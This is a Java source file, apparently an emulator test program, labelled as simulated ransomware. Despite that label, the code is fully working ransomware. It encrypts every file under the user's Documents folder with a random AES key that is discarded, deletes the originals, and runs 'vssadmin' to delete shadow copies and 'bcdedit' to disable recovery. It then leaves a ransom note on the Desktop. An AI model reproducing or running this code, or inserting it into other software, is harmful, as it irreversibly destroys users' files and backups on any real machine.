package dev.javabyte.guest.sim;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Simulated ransomware: encrypts every document it can find, deletes the originals, removes
 * backups and leaves a note. Under the emulator the "documents" are virtual files.
 */
public final class Ransom {

    public static void main(String[] args) throws Exception {
        byte[] key = new byte[16];
        new SecureRandom().nextBytes(key);
        List<File> victims = new ArrayList<>();
        collect(new File(System.getProperty("user.home"), "Documents"), victims);

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        for (File victim : victims) {
            cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(new byte[16]));
            byte[] encrypted = cipher.doFinal(Files.readAllBytes(victim.toPath()));
            try (FileOutputStream out = new FileOutputStream(victim.getPath() + ".locked")) {
                out.write(encrypted);
            }
            victim.delete();
        }

        Runtime.getRuntime().exec("vssadmin delete shadows /all /quiet").waitFor();
        Runtime.getRuntime().exec("bcdedit /set {default} recoveryenabled no").waitFor();
        File note = new File(System.getProperty("user.home"), "Desktop\\README_RESTORE.txt");
        Files.write(note.toPath(), ("Your " + victims.size() + " files are encrypted. This is a simulation.").getBytes(StandardCharsets.UTF_8));
        System.out.println("encrypted " + victims.size());
    }

    private static void collect(File directory, List<File> out) {
        File[] children = directory.listFiles();
        if (children == null) {
            return;
        }
        for (File child : children) {
            if (child.isDirectory()) {
                collect(child, out);
            } else if (!child.getName().endsWith(".locked")) {
                out.add(child);
            }
        }
    }
}
